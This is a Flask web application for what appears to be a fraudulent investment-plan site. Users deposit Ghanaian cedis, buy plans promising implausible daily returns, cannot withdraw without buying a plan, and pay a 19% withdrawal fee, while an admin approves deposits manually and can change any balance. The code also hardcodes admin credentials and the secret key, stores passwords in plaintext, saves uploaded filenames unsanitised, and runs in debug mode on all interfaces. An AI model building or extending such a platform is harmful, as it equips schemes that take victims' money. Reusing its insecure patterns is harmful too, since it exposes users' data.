from flask import Flask, render_template, request, redirect, url_for, session, flash
import sqlite3
import os
from datetime import datetime

app = Flask(__name__)
app.secret_key = 'latex_foam_secure_key_2026'

UPLOAD_FOLDER = os.path.join('static', 'uploads')
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

PLANS_DATA = {
    '1': {'name': 'Plan one', 'price': 50.0, 'daily': 13.0, 'days': 50},
    '2': {'name': 'Plan two', 'price': 150.0, 'daily': 30.0, 'days': 50},
    '3': {'name': 'Plan three', 'price': 300.0, 'daily': 50.0, 'days': 50},
    '4': {'name': 'Plan four', 'price': 600.0, 'daily': 155.0, 'days': 50},
    '5': {'name': 'Plan five', 'price': 1000.0, 'daily': 450.0, 'days': 50}
}

def init_db():
    conn = sqlite3.connect('latex_foam.db')
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            phone TEXT UNIQUE NOT NULL,
            password TEXT NOT NULL,
            withdraw_password TEXT NOT NULL,
            invite_code TEXT,
            balance REAL DEFAULT 30.0
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS deposits (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            amount REAL NOT NULL,
            reference TEXT,
            screenshot_path TEXT,
            status TEXT DEFAULT 'Pending',
            date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY(user_id) REFERENCES users(id)
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS withdrawals (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            amount REAL NOT NULL,
            fee REAL NOT NULL,
            network TEXT NOT NULL,
            wallet_number TEXT NOT NULL,
            status TEXT DEFAULT 'Bank Processing',
            date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            approved_date TEXT,
            FOREIGN KEY(user_id) REFERENCES users(id)
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS user_plans (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            plan_id TEXT NOT NULL,
            price REAL NOT NULL,
            daily_profit REAL NOT NULL,
            date_purchased TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY(user_id) REFERENCES users(id)
        )
    ''')
    conn.commit()
    conn.close()

init_db()

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        phone = request.form.get('phone')
        password = request.form.get('password')
        withdraw_password = request.form.get('withdraw_password')
        invite_code = request.form.get('invite_code')
        if not phone or not password or not withdraw_password:
            flash('Please fill in all required fields!', 'error')
            return redirect(url_for('register'))
        try:
            conn = sqlite3.connect('latex_foam.db')
            cursor = conn.cursor()
            cursor.execute('INSERT INTO users (phone, password, withdraw_password, invite_code, balance) VALUES (?, ?, ?, ?, 30.0)', (phone, password, withdraw_password, invite_code))
            conn.commit()
            conn.close()
            flash('Registration successful! Please login.', 'success')
            return redirect(url_for('login'))
        except sqlite3.IntegrityError:
            flash('This phone number is already registered!', 'error')
            return redirect(url_for('register'))
    return render_template('register.html')

@app.route('/', methods=['GET', 'POST'])
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        phone = request.form.get('phone')
        password = request.form.get('password')
        conn = sqlite3.connect('latex_foam.db')
        cursor = conn.cursor()
        cursor.execute('SELECT * FROM users WHERE phone = ? AND password = ?', (phone, password))
        user = cursor.fetchone()
        conn.close()
        if user:
            session['user_id'] = user[0]
            session['phone'] = user[1]
            return redirect(url_for('dashboard'))
        else:
            flash('Invalid phone number or password!', 'error')
            return redirect(url_for('login'))
    return render_template('login.html')

@app.route('/dashboard')
def dashboard():
    if 'user_id' not in session: 
        return redirect(url_for('login'))
    conn = sqlite3.connect('latex_foam.db')
    cursor = conn.cursor()
    cursor.execute('SELECT balance FROM users WHERE id = ?', (session['user_id'],))
    result = cursor.fetchone()
    conn.close()
    current_balance = result[0] if result else 0.0
    return render_template('dashboard.html', user_phone=session['phone'], user_balance=current_balance)

@app.route('/deposit', methods=['GET', 'POST'])
def deposit():
    if 'user_id' not in session: 
        return redirect(url_for('login'))
    if request.method == 'POST':
        amount_raw = request.form.get('amount')
        reference = request.form.get('reference')
        file = request.files.get('screenshot')
        amount = float(amount_raw) if amount_raw else 0
        if amount < 100:
            flash('Minimum deposit requirement is 100 GHS!', 'error')
            return redirect(url_for('deposit'))
        if file and reference:
            filename = f"user_{session['user_id']}_{int(datetime.now().timestamp())}_{file.filename}"
            filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
            file.save(filepath)
            conn = sqlite3.connect('latex_foam.db')
            cursor = conn.cursor()
            cursor.execute('INSERT INTO deposits (user_id, amount, reference, screenshot_path, status) VALUES (?, ?, ?, ?, "Pending")', (session['user_id'], amount, reference, filepath))
            conn.commit()
            conn.close()
            flash('Deposit order submitted!', 'success')
            return redirect(url_for('deposit'))
    conn = sqlite3.connect('latex_foam.db')
    cursor = conn.cursor()
    cursor.execute('SELECT balance FROM users WHERE id = ?', (session['user_id'],))
    result = cursor.fetchone()
    user_balance = result[0] if result else 0.0
    conn.close()
    return render_template('deposit.html', user_balance=user_balance)

@app.route('/withdraw', methods=['GET', 'POST'])
def withdraw():
    if 'user_id' not in session:
        return redirect(url_for('login'))

    conn = sqlite3.connect('latex_foam.db')
    cursor = conn.cursor()

    if request.method == 'POST':
        amount_raw = request.form.get('amount')
        network = request.form.get('network')
        wallet_number = request.form.get('wallet_number')
        withdraw_password = request.form.get('withdraw_password')

        amount = float(amount_raw) if amount_raw else 0

        if amount < 50:
            flash('Minimum withdrawal amount is 50 GHS!', 'error')
            conn.close()
            return redirect(url_for('withdraw'))

        # User must have purchased a plan
        cursor.execute(
            "SELECT id FROM user_plans WHERE user_id = ?",
            (session['user_id'],)
        )
        active_plan = cursor.fetchone()

        if not active_plan:
            flash('You must purchase a plan before you can withdraw!', 'error')
            conn.close()
            return redirect(url_for('withdraw'))

        cursor.execute(
            "SELECT balance, withdraw_password FROM users WHERE id = ?",
            (session['user_id'],)
        )
        user_data = cursor.fetchone()

        if user_data:
            current_balance = user_data[0]
            db_withdraw_password = user_data[1]

            if amount > current_balance:
                flash('Insufficient account balance!', 'error')

            elif withdraw_password != db_withdraw_password:
                flash('Incorrect withdrawal password!', 'error')

            else:
                fee = amount * 0.19
                actual_payout = amount - fee
                new_balance = current_balance - amount

                cursor.execute(
                    "UPDATE users SET balance=? WHERE id=?",
                    (new_balance, session['user_id'])
                )

                cursor.execute(
                    """
                    INSERT INTO withdrawals
                    (user_id, amount, fee, network, wallet_number, status)
                    VALUES (?, ?, ?, ?, ?, 'Bank Processing')
                    """,
                    (
                        session['user_id'],
                        actual_payout,
                        fee,
                        network,
                        wallet_number
                    )
                )

                conn.commit()
                flash('Withdrawal request sent to admin.', 'success')

    cursor.execute(
        "SELECT balance FROM users WHERE id=?",
        (session['user_id'],)
    )

    result = cursor.fetchone()
    user_balance = result[0] if result else 0.0

    conn.close()

    return render_template(
        'withdraw.html',
        user_balance=user_balance
    )

@app.route('/service')
def service():
    return render_template('service.html')
@app.route('/plan', methods=['GET', 'POST'])
def plan():
    if 'user_id' not in session:
        return redirect(url_for('login'))

    conn = sqlite3.connect('latex_foam.db')
    cursor = conn.cursor()

    if request.method == 'POST':
        plan_id = request.form.get('plan_id')

        if plan_id in PLANS_DATA:
            selected_plan = PLANS_DATA[plan_id]

            cursor.execute(
                'SELECT * FROM user_plans WHERE user_id=? AND plan_id=?',
                (session['user_id'], plan_id)
            )

            if cursor.fetchone():
                flash(f"{selected_plan['name']} is already running.", 'error')

            else:
                cursor.execute(
                    'SELECT balance FROM users WHERE id=?',
                    (session['user_id'],)
                )

                user = cursor.fetchone()
                balance = user[0]

                if balance < selected_plan['price']:
                    flash('Insufficient balance!', 'error')

                else:
                    new_balance = balance - selected_plan['price']

                    cursor.execute(
                        'UPDATE users SET balance=? WHERE id=?',
                        (new_balance, session['user_id'])
                    )

                    cursor.execute(
                        'INSERT INTO user_plans (user_id, plan_id, price, daily_profit) VALUES (?, ?, ?, ?)',
                        (
                            session['user_id'],
                            plan_id,
                            selected_plan['price'],
                            selected_plan['daily']
                        )
                    )

                    conn.commit()
                    flash('Plan purchased successfully!', 'success')

        return redirect(url_for('plan'))

    conn.close()
    return render_template('plan.html', plans=PLANS_DATA)
@app.route('/my_plan')
def my_plan():
    return render_template('my_plan.html')
@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))
@app.route('/profile')
def profile():
    if 'user_id' not in session:
        return redirect(url_for('login'))

    user_phone = session.get('phone', 'No phone number')
    user_balance = session.get('balance', 30)

    return render_template(
        'profile.html',
        user_phone=user_phone,
        account_number=user_phone,
        user_balance=user_balance)
 

    user_phone = session.get('phone', 'No phone number')
    user_balance = session.get('balance', 0)

    return render_template(
        'profile.html',
        user_phone=user_phone,
        account_number=user_phone,
        user_balance=user_balance
    )

@app.route('/admin_login', methods=['GET', 'POST'])
def admin_login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')

        if username == "Williams" and password == "Williams12":
            session["admin"] = True
            return redirect(url_for('admin'))
        else:
            flash("Invalid admin username or password!", "error")

    return render_template("admin_login.html")
@app.route('/admin/adjust_balance', methods=['POST'])
def admin_adjust_balance():

    if not session.get("admin"):
        return redirect(url_for('admin_login'))

    phone = request.form.get('phone')
    amount = float(request.form.get('amount'))
    action_type = request.form.get('action_type')

    conn = sqlite3.connect('latex_foam.db')
    cursor = conn.cursor()

    cursor.execute(
        "SELECT balance FROM users WHERE phone=?",
        (phone,)
    )

    user = cursor.fetchone()

    if user is None:
        conn.close()
        flash("User not found!", "error")
        return redirect(url_for('admin'))

    balance = user[0]

    if action_type == "add":
        balance += amount

    elif action_type == "deduct":
        balance -= amount

        if balance < 0:
            balance = 0

    cursor.execute(
        "UPDATE users SET balance=? WHERE phone=?",
        (balance, phone)
    )

    conn.commit()
    conn.close()

    flash("Balance updated successfully!", "success")

    return redirect(url_for('admin'))  
@app.route('/admin')
def admin():

    if not session.get("admin"):
        return redirect(url_for('admin_login'))

    conn = sqlite3.connect('latex_foam.db')
    conn.row_factory = sqlite3.Row
    cursor = conn.cursor()

    # Get all users
    cursor.execute("""
        SELECT id, phone, balance
        FROM users
        ORDER BY id DESC
    """)
    users = cursor.fetchall()


    # Get pending deposits
    cursor.execute("""
        SELECT 
            deposits.id,
            deposits.amount,
            deposits.reference,
            deposits.screenshot_path,
            users.phone
        FROM deposits
        JOIN users 
        ON deposits.user_id = users.id
        WHERE deposits.status = 'Pending'
    """)
    pending_deposits = cursor.fetchall()


    # Get pending withdrawals
    cursor.execute("""
        SELECT 
            withdrawals.id,
            withdrawals.amount,
            withdrawals.fee,
            withdrawals.network,
            withdrawals.wallet_number,
            users.phone
        FROM withdrawals
        JOIN users
        ON withdrawals.user_id = users.id
        WHERE withdrawals.status = 'Bank Processing'
    """)
    pending_withdrawals = cursor.fetchall()


    conn.close()


    return render_template(
        "admin.html",
        users=users,
        pending_deposits=pending_deposits,
        pending_withdrawals=pending_withdrawals
    )
@app.route('/admin/deposit/<int:id>/<action>')
def admin_handle_deposit(id, action):

    if not session.get("admin"):
        return redirect(url_for('admin_login'))

    conn = sqlite3.connect('latex_foam.db')
    cursor = conn.cursor()

    cursor.execute(
        "SELECT user_id, amount FROM deposits WHERE id=?",
        (id,)
    )

    deposit = cursor.fetchone()

    if not deposit:
        conn.close()
        flash("Deposit not found!", "error")
        return redirect(url_for('admin'))

    user_id = deposit[0]
    amount = deposit[1]

    if action == "accept":

        cursor.execute(
            "UPDATE users SET balance = balance + ? WHERE id=?",
            (amount, user_id)
        )

        cursor.execute(
            "UPDATE deposits SET status='Approved' WHERE id=?",
            (id,)
        )

        flash("Deposit approved. User balance updated.", "success")


    elif action == "reject":

        cursor.execute(
            "UPDATE deposits SET status='Rejected' WHERE id=?",
            (id,)
        )

        flash("Deposit rejected.", "error")


    conn.commit()
    conn.close()

    return redirect(url_for('admin'))
@app.route('/admin/withdrawal/<int:id>/<action>')
def admin_handle_withdrawal(id, action):

    if not session.get("admin"):
        return redirect(url_for('admin_login'))

    conn = sqlite3.connect('latex_foam.db')
    cursor = conn.cursor()

    cursor.execute(
        "SELECT user_id, amount, fee FROM withdrawals WHERE id=?",
        (id,)
    )
    withdrawal = cursor.fetchone()

    if withdrawal is None:
        conn.close()
        flash("Withdrawal not found!", "error")
        return redirect(url_for('admin'))

    user_id = withdrawal[0]
    amount = withdrawal[1]
    fee = withdrawal[2]

    if action == "accept":
        cursor.execute(
            "UPDATE withdrawals SET status='Completed', approved_date=? WHERE id=?",
            (datetime.now().strftime("%Y-%m-%d %H:%M:%S"), id)
        )
        flash("Withdrawal approved successfully!", "success")

    elif action == "reject":
        refund = amount + fee

        cursor.execute(
            "UPDATE users SET balance = balance + ? WHERE id=?",
            (refund, user_id)
        )

        cursor.execute(
            "UPDATE withdrawals SET status='Rejected' WHERE id=?",
            (id,)
        )

        flash("Withdrawal rejected. Funds returned to user.", "success")

    conn.commit()
    conn.close()
@app.route('/recharge')
def recharge():
    return render_template('recharge.html')

@app.route('/admin/withdraw')
def admin_withdraw():
    return render_template('admin_withdraw.html')


@app.route('/details')
def details():
    return render_template('details.html')
@app.route('/admin/logout')
def admin_logout():
    session.clear()
    return redirect(url_for('login'))
    return redirect(url_for('admin'))
if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
